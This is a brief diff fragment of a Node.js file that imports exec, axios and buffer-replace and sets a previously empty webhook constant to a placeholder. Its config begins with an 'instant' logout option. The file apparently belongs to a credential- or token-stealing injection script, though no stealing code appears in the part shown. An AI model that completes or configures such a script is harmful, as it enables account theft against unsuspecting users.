@@ -6,7 +6,7 @@ const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const webhook = ""
+const webhook = "da_webhook"
 
 const config = {
     "logout": "instant",
